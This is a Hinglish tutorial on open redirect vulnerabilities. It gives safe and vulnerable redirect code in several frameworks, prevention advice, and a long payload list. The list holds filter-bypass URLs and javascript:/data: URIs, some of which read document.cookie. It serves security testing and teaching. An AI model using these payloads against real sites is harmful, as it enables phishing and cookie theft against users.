### Open Redirect Payload List


"Unvalidated redirects aur forwards tab possible hote hain jab ek web application aise input ko accept karta hai jo trusted nahi hota, aur us input ki wajah se user ko kisi aur URL par redirect kar diya jata hai. Agar attacker is input ko modify karke kisi malicious (dangerous) site ka URL daal deta hai, to wo phishing attack launch kar sakta hai aur users ke login details ya credentials chura sakta hai."

"Kyunki modified link mein server name original site ke jaisa hi hota hai, is wajah se phishing attempts zyada trustworthy (ya real) lagte hain. Unvalidated redirect aur forward attacks ka use attacker is tarah se bhi kar sakta hai ki wo ek aisa URL banaye jo application ke access control check ko pass kar jaye, aur fir attacker ko un privileged functions tak le jaye jahan normally usse access nahi milta."

#### Java :

```
response.sendRedirect("http://www.mysite.com");  
```

#### PHP :

```
<?php
/* Redirect browser */
header("Location: http://www.mysite.com");
?>
```

#### ASP .NET :

```
Response.Redirect("~/folder/Login.aspx")
```

#### Rails :

```
redirect_to login_path
```

"Upar diye gaye examples mein, URL code ke andar clearly declare kiya gaya hai, isliye attacker usse manipulate (badal) nahi kar sakta."

#### Dangerous URL Redirects

"Neeche diye gaye examples unsafe (suraksha ke liye khatarnak) redirect aur forward code ko dikhate hain."

#### Dangerous URL Redirect Example 1

"Neeche diya gaya Java code ek parameter jiska naam url hai (GET ya POST request se aata hai) se URL receive karta hai, aur user ko usi URL par redirect kar deta hai:"

```
response.sendRedirect(request.getParameter("url"));
```

"Neeche diya gaya PHP code query string se (jisme parameter ka naam url hai) ek URL leta hai, aur fir user ko us URL par redirect kar deta hai:"

```
$redirect_url = $_GET['url'];
header("Location: " . $redirect_url);
```

"C# .NET ka ek milta-julta vulnerable (kamzor ya unsafe) code ka example neeche diya gaya hai:"

```
string url = request.QueryString["url"];
Response.Redirect(url);
```

And in Rails:

```
redirect_to params[:url]
```

"Upar wala code vulnerable (kamzor) hai agar usme URL ki validity check karne ke liye koi validation ya extra control method apply nahi kiya gaya ho. Is vulnerability ka misuse phishing scam ke liye ho sakta hai, jisme users ko malicious site par redirect kiya ja sakta hai."

"Agar koi validation apply nahi kiya gaya, to ek malicious user aisi hyperlink bana sakta hai jo aapke users ko ek unvalidated aur malicious website par redirect kar de, jaise ki:"

```
http://example.com/example.php?url=http://malicious.example.com
```

"User link ko original trusted site (example.com) ke liye jaate hue dekhta hai, aur usse pata nahi chalta ki actually wo redirect hokar kisi aur site par ja sakta hai."

#### Dangerous URL Redirect Example 2

"ASP .NET MVC 1 aur 2 websites specially open redirection attacks ke liye vulnerable hoti hain. Is vulnerability se bachne ke liye, aapko MVC 3 use karna chahiye."

"ASP.NET MVC 2 application mein LogOn action ka code neeche dikhaya gaya hai. Successful login ke baad, controller returnUrl par redirect karta hai. Aap dekh sakte ho ki returnUrl parameter ke against koi validation perform nahi ki ja rahi."


"ASP.NET MVC 2 mein LogOn action, jo AccountController.cs mein hota hai (context ke liye upar diye gaye Microsoft Docs link ko dekhein):"

```
[HttpPost]
 public ActionResult LogOn(LogOnModel model, string returnUrl)
 {
   if (ModelState.IsValid)
   {
     if (MembershipService.ValidateUser(model.UserName, model.Password))
     {
       FormsService.SignIn(model.UserName, model.RememberMe);
       if (!String.IsNullOrEmpty(returnUrl))
       {
         return Redirect(returnUrl);
       }
       else
       {
         return RedirectToAction("Index", "Home");
       }
     }
     else
     {
       ModelState.AddModelError("", "The user name or password provided is incorrect.");
     }
   }

   // If we got this far, something failed, redisplay form
   return View(model);
 }
```

#### Preventing Unvalidated Redirects and Forwards

"Redirects aur forwards ka safe use kai tareekon se kiya ja sakta hai:

* Redirects aur forwards ka use avoid karne ki koshish karo.

* Agar use karna zaroori ho, toh destination ke liye user input se URL allow na karo. Yeh usually kiya ja sakta hai. Is case mein, aapko URL validate karne ke liye ek method hona chahiye.

* Agar user input ko avoid nahi kiya ja sakta, toh ensure karo ki diya gaya value valid ho, application ke liye appropriate ho, aur user ke liye authorized ho.

* Yeh recommend kiya jata hai ki destination input ko actual URL ya URL ke portion ki jagah kisi mapped value ke roop mein use kiya jaye, aur server side code is value ko target URL mein translate kare.

* Input ko sanitize karo, trusted URL's ki list (hosts ya regex ka use) create karke.

* Sabhi redirects ko pehle ek aise page par bhejo jo user ko notify kare ki wo aapke site se bahar ja rahe hain, aur unhe link par click karke confirm karna pade."

#### Open Redirect Payload List :

```
/%09/example.com
/%2f%2fexample.com
/%2f%2f%2fbing.com%2f%3fwww.omise.co
/%2f%5c%2f%67%6f%6f%67%6c%65%2e%63%6f%6d/
/%5cexample.com
/%68%74%74%70%3a%2f%2f%67%6f%6f%67%6c%65%2e%63%6f%6d
/.example.com
//%09/example.com
//%5cexample.com
///%09/example.com
///%5cexample.com
////%09/example.com
////%5cexample.com
/////example.com
/////example.com/
////\;@example.com
////example.com/
////example.com/%2e%2e
////example.com/%2e%2e%2f
////example.com/%2f%2e%2e
////example.com/%2f..
////example.com//
///\;@example.com
///example.com
///example.com/
//google.com/%2f..
//www.whitelisteddomain.tld@google.com/%2f..
///google.com/%2f..
///www.whitelisteddomain.tld@google.com/%2f..
////google.com/%2f..
////www.whitelisteddomain.tld@google.com/%2f..
https://google.com/%2f..
https://www.whitelisteddomain.tld@google.com/%2f..
/https://google.com/%2f..
/https://www.whitelisteddomain.tld@google.com/%2f..
//www.google.com/%2f%2e%2e
//www.whitelisteddomain.tld@www.google.com/%2f%2e%2e
///www.google.com/%2f%2e%2e
///www.whitelisteddomain.tld@www.google.com/%2f%2e%2e
////www.google.com/%2f%2e%2e
////www.whitelisteddomain.tld@www.google.com/%2f%2e%2e
https://www.google.com/%2f%2e%2e
https://www.whitelisteddomain.tld@www.google.com/%2f%2e%2e
/https://www.google.com/%2f%2e%2e
/https://www.whitelisteddomain.tld@www.google.com/%2f%2e%2e
//google.com/
//www.whitelisteddomain.tld@google.com/
///google.com/
///www.whitelisteddomain.tld@google.com/
////google.com/
////www.whitelisteddomain.tld@google.com/
https://google.com/
https://www.whitelisteddomain.tld@google.com/
/https://google.com/
/https://www.whitelisteddomain.tld@google.com/
//google.com//
//www.whitelisteddomain.tld@google.com//
///google.com//
///www.whitelisteddomain.tld@google.com//
////google.com//
////www.whitelisteddomain.tld@google.com//
https://google.com//
https://www.whitelisteddomain.tld@google.com//
//https://google.com//
//https://www.whitelisteddomain.tld@google.com//
//www.google.com/%2e%2e%2f
//www.whitelisteddomain.tld@www.google.com/%2e%2e%2f
///www.google.com/%2e%2e%2f
///www.whitelisteddomain.tld@www.google.com/%2e%2e%2f
////www.google.com/%2e%2e%2f
////www.whitelisteddomain.tld@www.google.com/%2e%2e%2f
https://www.google.com/%2e%2e%2f
https://www.whitelisteddomain.tld@www.google.com/%2e%2e%2f
//https://www.google.com/%2e%2e%2f
//https://www.whitelisteddomain.tld@www.google.com/%2e%2e%2f
///www.google.com/%2e%2e
///www.whitelisteddomain.tld@www.google.com/%2e%2e
////www.google.com/%2e%2e
////www.whitelisteddomain.tld@www.google.com/%2e%2e
https:///www.google.com/%2e%2e
https:///www.whitelisteddomain.tld@www.google.com/%2e%2e
//https:///www.google.com/%2e%2e
//www.whitelisteddomain.tld@https:///www.google.com/%2e%2e
/https://www.google.com/%2e%2e
/https://www.whitelisteddomain.tld@www.google.com/%2e%2e
///www.google.com/%2f%2e%2e
///www.whitelisteddomain.tld@www.google.com/%2f%2e%2e
////www.google.com/%2f%2e%2e
////www.whitelisteddomain.tld@www.google.com/%2f%2e%2e
https:///www.google.com/%2f%2e%2e
https:///www.whitelisteddomain.tld@www.google.com/%2f%2e%2e
/https://www.google.com/%2f%2e%2e
/https://www.whitelisteddomain.tld@www.google.com/%2f%2e%2e
/https:///www.google.com/%2f%2e%2e
/https:///www.whitelisteddomain.tld@www.google.com/%2f%2e%2e
/%09/google.com
/%09/www.whitelisteddomain.tld@google.com
//%09/google.com
//%09/www.whitelisteddomain.tld@google.com
///%09/google.com
///%09/www.whitelisteddomain.tld@google.com
////%09/google.com
////%09/www.whitelisteddomain.tld@google.com
https://%09/google.com
https://%09/www.whitelisteddomain.tld@google.com
/%5cgoogle.com
/%5cwww.whitelisteddomain.tld@google.com
//%5cgoogle.com
//%5cwww.whitelisteddomain.tld@google.com
///%5cgoogle.com
///%5cwww.whitelisteddomain.tld@google.com
////%5cgoogle.com
////%5cwww.whitelisteddomain.tld@google.com
https://%5cgoogle.com
https://%5cwww.whitelisteddomain.tld@google.com
/https://%5cgoogle.com
/https://%5cwww.whitelisteddomain.tld@google.com
https://google.com
https://www.whitelisteddomain.tld@google.com
javascript:alert(1);
javascript:alert(1)
//javascript:alert(1);
/javascript:alert(1);
//javascript:alert(1)
/javascript:alert(1)
/%5cjavascript:alert(1);
/%5cjavascript:alert(1)
//%5cjavascript:alert(1);
//%5cjavascript:alert(1)
/%09/javascript:alert(1);
/%09/javascript:alert(1)
java%0d%0ascript%0d%0a:alert(0)
//google.com
https:google.com
//google%E3%80%82com
\/\/google.com/
/\/google.com/
//google%00.com
https://www.whitelisteddomain.tld/https://www.google.com/
";alert(0);//
javascript://www.whitelisteddomain.tld?%a0alert%281%29
http://0xd8.0x3a.0xd6.0xce
http://www.whitelisteddomain.tld@0xd8.0x3a.0xd6.0xce
http://3H6k7lIAiqjfNeN@0xd8.0x3a.0xd6.0xce
http://XY>.7d8T\205pZM@0xd8.0x3a.0xd6.0xce
http://0xd83ad6ce
http://www.whitelisteddomain.tld@0xd83ad6ce
http://3H6k7lIAiqjfNeN@0xd83ad6ce
http://XY>.7d8T\205pZM@0xd83ad6ce
http://3627734734
http://www.whitelisteddomain.tld@3627734734
http://3H6k7lIAiqjfNeN@3627734734
http://XY>.7d8T\205pZM@3627734734
http://472.314.470.462
http://www.whitelisteddomain.tld@472.314.470.462
http://3H6k7lIAiqjfNeN@472.314.470.462
http://XY>.7d8T\205pZM@472.314.470.462
http://0330.072.0326.0316
http://www.whitelisteddomain.tld@0330.072.0326.0316
http://3H6k7lIAiqjfNeN@0330.072.0326.0316
http://XY>.7d8T\205pZM@0330.072.0326.0316
http://00330.00072.0000326.00000316
http://www.whitelisteddomain.tld@00330.00072.0000326.00000316
http://3H6k7lIAiqjfNeN@00330.00072.0000326.00000316
http://XY>.7d8T\205pZM@00330.00072.0000326.00000316
http://[::216.58.214.206]
http://www.whitelisteddomain.tld@[::216.58.214.206]
http://3H6k7lIAiqjfNeN@[::216.58.214.206]
http://XY>.7d8T\205pZM@[::216.58.214.206]
http://[::ffff:216.58.214.206]
http://www.whitelisteddomain.tld@[::ffff:216.58.214.206]
http://3H6k7lIAiqjfNeN@[::ffff:216.58.214.206]
http://XY>.7d8T\205pZM@[::ffff:216.58.214.206]
http://0xd8.072.54990
http://www.whitelisteddomain.tld@0xd8.072.54990
http://3H6k7lIAiqjfNeN@0xd8.072.54990
http://XY>.7d8T\205pZM@0xd8.072.54990
http://0xd8.3856078
http://www.whitelisteddomain.tld@0xd8.3856078
http://3H6k7lIAiqjfNeN@0xd8.3856078
http://XY>.7d8T\205pZM@0xd8.3856078
http://00330.3856078
http://www.whitelisteddomain.tld@00330.3856078
http://3H6k7lIAiqjfNeN@00330.3856078
http://XY>.7d8T\205pZM@00330.3856078
http://00330.0x3a.54990
http://www.whitelisteddomain.tld@00330.0x3a.54990
http://3H6k7lIAiqjfNeN@00330.0x3a.54990
http://XY>.7d8T\205pZM@00330.0x3a.54990
http:0xd8.0x3a.0xd6.0xce
http:www.whitelisteddomain.tld@0xd8.0x3a.0xd6.0xce
http:3H6k7lIAiqjfNeN@0xd8.0x3a.0xd6.0xce
http:XY>.7d8T\205pZM@0xd8.0x3a.0xd6.0xce
http:0xd83ad6ce
http:www.whitelisteddomain.tld@0xd83ad6ce
http:3H6k7lIAiqjfNeN@0xd83ad6ce
http:XY>.7d8T\205pZM@0xd83ad6ce
http:3627734734
http:www.whitelisteddomain.tld@3627734734
http:3H6k7lIAiqjfNeN@3627734734
http:XY>.7d8T\205pZM@3627734734
http:472.314.470.462
http:www.whitelisteddomain.tld@472.314.470.462
http:3H6k7lIAiqjfNeN@472.314.470.462
http:XY>.7d8T\205pZM@472.314.470.462
http:0330.072.0326.0316
http:www.whitelisteddomain.tld@0330.072.0326.0316
http:3H6k7lIAiqjfNeN@0330.072.0326.0316
http:XY>.7d8T\205pZM@0330.072.0326.0316
http:00330.00072.0000326.00000316
http:www.whitelisteddomain.tld@00330.00072.0000326.00000316
http:3H6k7lIAiqjfNeN@00330.00072.0000326.00000316
http:XY>.7d8T\205pZM@00330.00072.0000326.00000316
http:[::216.58.214.206]
http:www.whitelisteddomain.tld@[::216.58.214.206]
http:3H6k7lIAiqjfNeN@[::216.58.214.206]
http:XY>.7d8T\205pZM@[::216.58.214.206]
http:[::ffff:216.58.214.206]
http:www.whitelisteddomain.tld@[::ffff:216.58.214.206]
http:3H6k7lIAiqjfNeN@[::ffff:216.58.214.206]
http:XY>.7d8T\205pZM@[::ffff:216.58.214.206]
http:0xd8.072.54990
http:www.whitelisteddomain.tld@0xd8.072.54990
http:3H6k7lIAiqjfNeN@0xd8.072.54990
http:XY>.7d8T\205pZM@0xd8.072.54990
http:0xd8.3856078
http:www.whitelisteddomain.tld@0xd8.3856078
http:3H6k7lIAiqjfNeN@0xd8.3856078
http:XY>.7d8T\205pZM@0xd8.3856078
http:00330.3856078
http:www.whitelisteddomain.tld@00330.3856078
http:3H6k7lIAiqjfNeN@00330.3856078
http:XY>.7d8T\205pZM@00330.3856078
http:00330.0x3a.54990
http:www.whitelisteddomain.tld@00330.0x3a.54990
http:3H6k7lIAiqjfNeN@00330.0x3a.54990
http:XY>.7d8T\205pZM@00330.0x3a.54990
〱google.com
〵google.com
ゝgoogle.com
ーgoogle.com
ｰgoogle.com
/〱google.com
/〵google.com
/ゝgoogle.com
/ーgoogle.com
/ｰgoogle.com
%68%74%74%70%3a%2f%2f%67%6f%6f%67%6c%65%2e%63%6f%6d
http://%67%6f%6f%67%6c%65%2e%63%6f%6d
<>javascript:alert(1);
<>//google.com
//google.com\@www.whitelisteddomain.tld
https://:@google.com\@www.whitelisteddomain.tld
\x6A\x61\x76\x61\x73\x63\x72\x69\x70\x74\x3aalert(1)
\u006A\u0061\u0076\u0061\u0073\u0063\u0072\u0069\u0070\u0074\u003aalert(1)
ja\nva\tscript\r:alert(1)
\j\av\a\s\cr\i\pt\:\a\l\ert\(1\)
\152\141\166\141\163\143\162\151\160\164\072alert(1)
http://google.com:80#@www.whitelisteddomain.tld/
http://google.com:80?@www.whitelisteddomain.tld/
///example.com/%2e%2e
///example.com/%2e%2e%2f
///example.com/%2f%2e%2e
///example.com/%2f..
///example.com//
//example.com
//example.com/
//example.com/%2e%2e
//example.com/%2e%2e%2f
//example.com/%2f%2e%2e
//example.com/%2f..
//example.com//
//google%00.com
//google%E3%80%82com
//https:///example.com/%2e%2e
//https://example.com/%2e%2e%2f
//https://example.com//
/<>//example.com
/?url=//example.com&next=//example.com&redirect=//example.com&redir=//example.com&rurl=//example.com&redirect_uri=//example.com
/?url=/\/example.com&next=/\/example.com&redirect=/\/example.com&redirect_uri=/\/example.com
/?url=Https://example.com&next=Https://example.com&redirect=Https://example.com&redir=Https://example.com&rurl=Https://example.com&redirect_uri=Https://example.com
/\/\/example.com/
/\/example.com/
/example.com/%2f%2e%2e
/http://%67%6f%6f%67%6c%65%2e%63%6f%6d
/http://example.com
/http:/example.com
/https:/%5cexample.com/
/https://%09/example.com
/https://%5cexample.com
/https:///example.com/%2e%2e
/https:///example.com/%2f%2e%2e
/https://example.com
/https://example.com/
/https://example.com/%2e%2e
/https://example.com/%2e%2e%2f
/https://example.com/%2f%2e%2e
/https://example.com/%2f..
/https://example.com//
/https:example.com
/redirect?url=//example.com&next=//example.com&redirect=//example.com&redir=//example.com&rurl=//example.com&redirect_uri=//example.com
/redirect?url=/\/example.com&next=/\/example.com&redirect=/\/example.com&redir=/\/example.com&rurl=/\/example.com&redirect_uri=/\/example.com
/redirect?url=Https://example.com&next=Https://example.com&redirect=Https://example.com&redir=Https://example.com&rurl=Https://example.com&redirect_uri=Https://example.com

//%2fxgoogle.com
/ReceiveAutoRedirect/false?desiredLocationUrl=http://xssposed.org
//localdomain.pw/%2f..
//www.whitelisteddomain.tld@localdomain.pw/%2f..
///localdomain.pw/%2f..
///www.whitelisteddomain.tld@localdomain.pw/%2f..
////localdomain.pw/%2f..
////www.whitelisteddomain.tld@localdomain.pw/%2f..
https://localdomain.pw/%2f..
https://www.whitelisteddomain.tld@localdomain.pw/%2f..
/https://localdomain.pw/%2f..
/https://www.whitelisteddomain.tld@localdomain.pw/%2f..
//localdomain.pw/%2f%2e%2e
//www.whitelisteddomain.tld@localdomain.pw/%2f%2e%2e
///localdomain.pw/%2f%2e%2e
///www.whitelisteddomain.tld@localdomain.pw/%2f%2e%2e
////localdomain.pw/%2f%2e%2e
////www.whitelisteddomain.tld@localdomain.pw/%2f%2e%2e
https://localdomain.pw/%2f%2e%2e
https://www.whitelisteddomain.tld@localdomain.pw/%2f%2e%2e
/https://localdomain.pw/%2f%2e%2e
/https://www.whitelisteddomain.tld@localdomain.pw/%2f%2e%2e
//localdomain.pw/
//www.whitelisteddomain.tld@localdomain.pw/
///localdomain.pw/
///www.whitelisteddomain.tld@localdomain.pw/
////localdomain.pw/
////www.whitelisteddomain.tld@localdomain.pw/
https://localdomain.pw/
https://www.whitelisteddomain.tld@localdomain.pw/
/https://localdomain.pw/
/https://www.whitelisteddomain.tld@localdomain.pw/
//localdomain.pw//
//www.whitelisteddomain.tld@localdomain.pw//
///localdomain.pw//
///www.whitelisteddomain.tld@localdomain.pw//
////localdomain.pw//
////www.whitelisteddomain.tld@localdomain.pw//
https://localdomain.pw//
https://www.whitelisteddomain.tld@localdomain.pw//
//https://localdomain.pw//
//https://www.whitelisteddomain.tld@localdomain.pw//
//localdomain.pw/%2e%2e%2f
//www.whitelisteddomain.tld@localdomain.pw/%2e%2e%2f
///localdomain.pw/%2e%2e%2f
///www.whitelisteddomain.tld@localdomain.pw/%2e%2e%2f
////localdomain.pw/%2e%2e%2f
////www.whitelisteddomain.tld@localdomain.pw/%2e%2e%2f
https://localdomain.pw/%2e%2e%2f
https://www.whitelisteddomain.tld@localdomain.pw/%2e%2e%2f
//https://localdomain.pw/%2e%2e%2f
//https://www.whitelisteddomain.tld@localdomain.pw/%2e%2e%2f
///localdomain.pw/%2e%2e
///www.whitelisteddomain.tld@localdomain.pw/%2e%2e
////localdomain.pw/%2e%2e
////www.whitelisteddomain.tld@localdomain.pw/%2e%2e
https:///localdomain.pw/%2e%2e
https:///www.whitelisteddomain.tld@localdomain.pw/%2e%2e
//https:///localdomain.pw/%2e%2e
//www.whitelisteddomain.tld@https:///localdomain.pw/%2e%2e
/https://localdomain.pw/%2e%2e
/https://www.whitelisteddomain.tld@localdomain.pw/%2e%2e
///localdomain.pw/%2f%2e%2e
///www.whitelisteddomain.tld@localdomain.pw/%2f%2e%2e
////localdomain.pw/%2f%2e%2e
////www.whitelisteddomain.tld@localdomain.pw/%2f%2e%2e
https:///localdomain.pw/%2f%2e%2e
https:///www.whitelisteddomain.tld@localdomain.pw/%2f%2e%2e
/https://localdomain.pw/%2f%2e%2e
/https://www.whitelisteddomain.tld@localdomain.pw/%2f%2e%2e
/https:///localdomain.pw/%2f%2e%2e
/https:///www.whitelisteddomain.tld@localdomain.pw/%2f%2e%2e
/%09/localdomain.pw
/%09/www.whitelisteddomain.tld@localdomain.pw
//%09/localdomain.pw
//%09/www.whitelisteddomain.tld@localdomain.pw
///%09/localdomain.pw
///%09/www.whitelisteddomain.tld@localdomain.pw
////%09/localdomain.pw
////%09/www.whitelisteddomain.tld@localdomain.pw
https://%09/localdomain.pw
https://%09/www.whitelisteddomain.tld@localdomain.pw
/%5clocaldomain.pw
/%5cwww.whitelisteddomain.tld@localdomain.pw
//%5clocaldomain.pw
//%5cwww.whitelisteddomain.tld@localdomain.pw
///%5clocaldomain.pw
///%5cwww.whitelisteddomain.tld@localdomain.pw
////%5clocaldomain.pw
////%5cwww.whitelisteddomain.tld@localdomain.pw
https://%5clocaldomain.pw
https://%5cwww.whitelisteddomain.tld@localdomain.pw
/https://%5clocaldomain.pw
/https://%5cwww.whitelisteddomain.tld@localdomain.pw
https://localdomain.pw
https://www.whitelisteddomain.tld@localdomain.pw
javascript:alert(1);
javascript:alert(1)
//javascript:alert(1);
/javascript:alert(1);
//javascript:alert(1)
/javascript:alert(1)
/%5cjavascript:alert(1);
/%5cjavascript:alert(1)
//%5cjavascript:alert(1);
//%5cjavascript:alert(1)
/%09/javascript:alert(1);
/%09/javascript:alert(1)
java%0d%0ascript%0d%0a:alert(0)
//localdomain.pw
https:localdomain.pw
//localdomain%E3%80%82pw
\/\/localdomain.pw/
/\/localdomain.pw/
/%2f%5c%2f%67%6f%6f%67%6c%65%2e%63%6f%6d/
//localdomain%00.pw
https://www.whitelisteddomain.tld/https://localdomain.pw/
";alert(0);//
javascript://www.whitelisteddomain.tld?%a0alert%281%29
http://0xd8.0x3a.0xd6.0xce
http://www.whitelisteddomain.tld@0xd8.0x3a.0xd6.0xce
http://3H6k7lIAiqjfNeN@0xd8.0x3a.0xd6.0xce
http://XY>.7d8T\205pZM@0xd8.0x3a.0xd6.0xce
http://0xd83ad6ce
http://www.whitelisteddomain.tld@0xd83ad6ce
http://3H6k7lIAiqjfNeN@0xd83ad6ce
http://XY>.7d8T\205pZM@0xd83ad6ce
http://3627734734
http://www.whitelisteddomain.tld@3627734734
http://3H6k7lIAiqjfNeN@3627734734
http://XY>.7d8T\205pZM@3627734734
http://472.314.470.462
http://www.whitelisteddomain.tld@472.314.470.462
http://3H6k7lIAiqjfNeN@472.314.470.462
http://XY>.7d8T\205pZM@472.314.470.462
http://0330.072.0326.0316
http://www.whitelisteddomain.tld@0330.072.0326.0316
http://3H6k7lIAiqjfNeN@0330.072.0326.0316
http://XY>.7d8T\205pZM@0330.072.0326.0316
http://00330.00072.0000326.00000316
http://www.whitelisteddomain.tld@00330.00072.0000326.00000316
http://3H6k7lIAiqjfNeN@00330.00072.0000326.00000316
http://XY>.7d8T\205pZM@00330.00072.0000326.00000316
http://[::216.58.214.206]
http://www.whitelisteddomain.tld@[::216.58.214.206]
http://3H6k7lIAiqjfNeN@[::216.58.214.206]
http://XY>.7d8T\205pZM@[::216.58.214.206]
http://[::ffff:216.58.214.206]
http://www.whitelisteddomain.tld@[::ffff:216.58.214.206]
http://3H6k7lIAiqjfNeN@[::ffff:216.58.214.206]
http://XY>.7d8T\205pZM@[::ffff:216.58.214.206]
http://0xd8.072.54990
http://www.whitelisteddomain.tld@0xd8.072.54990
http://3H6k7lIAiqjfNeN@0xd8.072.54990
http://XY>.7d8T\205pZM@0xd8.072.54990
http://0xd8.3856078
http://www.whitelisteddomain.tld@0xd8.3856078
http://3H6k7lIAiqjfNeN@0xd8.3856078
http://XY>.7d8T\205pZM@0xd8.3856078
http://00330.3856078
http://www.whitelisteddomain.tld@00330.3856078
http://3H6k7lIAiqjfNeN@00330.3856078
http://XY>.7d8T\205pZM@00330.3856078
http://00330.0x3a.54990
http://www.whitelisteddomain.tld@00330.0x3a.54990
http://3H6k7lIAiqjfNeN@00330.0x3a.54990
http://XY>.7d8T\205pZM@00330.0x3a.54990
http:0xd8.0x3a.0xd6.0xce
http:www.whitelisteddomain.tld@0xd8.0x3a.0xd6.0xce
http:3H6k7lIAiqjfNeN@0xd8.0x3a.0xd6.0xce
http:XY>.7d8T\205pZM@0xd8.0x3a.0xd6.0xce
http:0xd83ad6ce
http:www.whitelisteddomain.tld@0xd83ad6ce
http:3H6k7lIAiqjfNeN@0xd83ad6ce
http:XY>.7d8T\205pZM@0xd83ad6ce
http:3627734734
http:www.whitelisteddomain.tld@3627734734
http:3H6k7lIAiqjfNeN@3627734734
http:XY>.7d8T\205pZM@3627734734
http:472.314.470.462
http:www.whitelisteddomain.tld@472.314.470.462
http:3H6k7lIAiqjfNeN@472.314.470.462
http:XY>.7d8T\205pZM@472.314.470.462
http:0330.072.0326.0316
http:www.whitelisteddomain.tld@0330.072.0326.0316
http:3H6k7lIAiqjfNeN@0330.072.0326.0316
http:XY>.7d8T\205pZM@0330.072.0326.0316
http:00330.00072.0000326.00000316
http:www.whitelisteddomain.tld@00330.00072.0000326.00000316
http:3H6k7lIAiqjfNeN@00330.00072.0000326.00000316
http:XY>.7d8T\205pZM@00330.00072.0000326.00000316
http:[::216.58.214.206]
http:www.whitelisteddomain.tld@[::216.58.214.206]
http:3H6k7lIAiqjfNeN@[::216.58.214.206]
http:XY>.7d8T\205pZM@[::216.58.214.206]
http:[::ffff:216.58.214.206]
http:www.whitelisteddomain.tld@[::ffff:216.58.214.206]
http:3H6k7lIAiqjfNeN@[::ffff:216.58.214.206]
http:XY>.7d8T\205pZM@[::ffff:216.58.214.206]
http:0xd8.072.54990
http:www.whitelisteddomain.tld@0xd8.072.54990
http:3H6k7lIAiqjfNeN@0xd8.072.54990
http:XY>.7d8T\205pZM@0xd8.072.54990
http:0xd8.3856078
http:www.whitelisteddomain.tld@0xd8.3856078
http:3H6k7lIAiqjfNeN@0xd8.3856078
http:XY>.7d8T\205pZM@0xd8.3856078
http:00330.3856078
http:www.whitelisteddomain.tld@00330.3856078
http:3H6k7lIAiqjfNeN@00330.3856078
http:XY>.7d8T\205pZM@00330.3856078
http:00330.0x3a.54990
http:www.whitelisteddomain.tld@00330.0x3a.54990
http:3H6k7lIAiqjfNeN@00330.0x3a.54990
http:XY>.7d8T\205pZM@00330.0x3a.54990
〱localdomain.pw
〵localdomain.pw
ゝlocaldomain.pw
ーlocaldomain.pw
ｰlocaldomain.pw
/〱localdomain.pw
/〵localdomain.pw
/ゝlocaldomain.pw
/ーlocaldomain.pw
/ｰlocaldomain.pw
%68%74%74%70%3a%2f%2f%67%6f%6f%67%6c%65%2e%63%6f%6d
http://%67%6f%6f%67%6c%65%2e%63%6f%6d
<>javascript:alert(1);
<>//localdomain.pw
//localdomain.pw\@www.whitelisteddomain.tld
https://:@localdomain.pw\@www.whitelisteddomain.tld
\x6A\x61\x76\x61\x73\x63\x72\x69\x70\x74\x3aalert(1)
\u006A\u0061\u0076\u0061\u0073\u0063\u0072\u0069\u0070\u0074\u003aalert(1)
ja\nva\tscript\r:alert(1)
\j\av\a\s\cr\i\pt\:\a\l\ert\(1\)
\152\141\166\141\163\143\162\151\160\164\072alert(1)
http://localdomain.pw:80#@www.whitelisteddomain.tld/
http://localdomain.pw:80?@www.whitelisteddomain.tld/
http://3H6k7lIAiqjfNeN@www.whitelisteddomain.tld+@localdomain.pw/
http://XY>.7d8T\205pZM@www.whitelisteddomain.tld+@localdomain.pw/
http://3H6k7lIAiqjfNeN@www.whitelisteddomain.tld@localdomain.pw/
http://XY>.7d8T\205pZM@www.whitelisteddomain.tld@localdomain.pw/
http://www.whitelisteddomain.tld+&@localdomain.pw#+@www.whitelisteddomain.tld/
http://localdomain.pw\twww.whitelisteddomain.tld/
//localdomain.pw:80#@www.whitelisteddomain.tld/
//localdomain.pw:80?@www.whitelisteddomain.tld/
//3H6k7lIAiqjfNeN@www.whitelisteddomain.tld+@localdomain.pw/
//XY>.7d8T\205pZM@www.whitelisteddomain.tld+@localdomain.pw/
//3H6k7lIAiqjfNeN@www.whitelisteddomain.tld@localdomain.pw/
//XY>.7d8T\205pZM@www.whitelisteddomain.tld@localdomain.pw/
//www.whitelisteddomain.tld+&@localdomain.pw#+@www.whitelisteddomain.tld/
//localdomain.pw\twww.whitelisteddomain.tld/
//;@localdomain.pw
http://;@localdomain.pw
@localdomain.pw
javascript://https://www.whitelisteddomain.tld/?z=%0Aalert(1)
data:text/html;base64,PHNjcmlwdD5hbGVydCgiWFNTIik8L3NjcmlwdD4=
http://localdomain.pw%2f%2f.www.whitelisteddomain.tld/
http://localdomain.pw%5c%5c.www.whitelisteddomain.tld/
http://localdomain.pw%3F.www.whitelisteddomain.tld/
http://localdomain.pw%23.www.whitelisteddomain.tld/
http://www.whitelisteddomain.tld:80%40localdomain.pw/
http://www.whitelisteddomain.tld%2elocaldomain.pw/
/x:1/:///%01javascript:alert(document.cookie)/
/https:/%5clocaldomain.pw/
javascripT://anything%0D%0A%0D%0Awindow.alert(document.cookie)
/http://localdomain.pw
/%2f%2flocaldomain.pw
/localdomain.pw/%2f%2e%2e
/http:/localdomain.pw
/.localdomain.pw
http://.localdomain.pw
.localdomain.pw
///\;@localdomain.pw
///localdomain.pw
/////localdomain.pw/
/////localdomain.pw
java%0ascript:alert(1)
java%09script:alert(1)
java%0dscript:alert(1)
javascript://%0aalert(1)
Javas%26%2399;ript:alert(1)
data:www.whitelisteddomain.tld;text/html;charset=UTF-8,<html><script>document.write(document.domain);</script><iframe/src=xxxxx>aaaa</iframe></html>
jaVAscript://www.whitelisteddomain.tld//%0d%0aalert(1);//
http://www.localdomain.pw\.www.whitelisteddomain.tld
%19Jav%09asc%09ript:https%20://www.whitelisteddomain.tld/%250Aconfirm%25281%2529
//example.com@google.com/%2f..
///google.com/%2f..
///example.com@google.com/%2f..
////google.com/%2f..
////example.com@google.com/%2f..
https://google.com/%2f..
https://example.com@google.com/%2f..
/https://google.com/%2f..
/https://example.com@google.com/%2f..
//google.com/%2f%2e%2e
//example.com@google.com/%2f%2e%2e
///google.com/%2f%2e%2e
///example.com@google.com/%2f%2e%2e
////google.com/%2f%2e%2e
////example.com@google.com/%2f%2e%2e
https://google.com/%2f%2e%2e
https://example.com@google.com/%2f%2e%2e
/https://google.com/%2f%2e%2e
/https://example.com@google.com/%2f%2e%2e
//google.com/
//example.com@google.com/
///google.com/
///example.com@google.com/
////google.com/
////example.com@google.com/
https://google.com/
https://example.com@google.com/
/https://google.com/
/https://example.com@google.com/
//google.com//
//example.com@google.com//
///google.com//
///example.com@google.com//
////google.com//
////example.com@google.com//
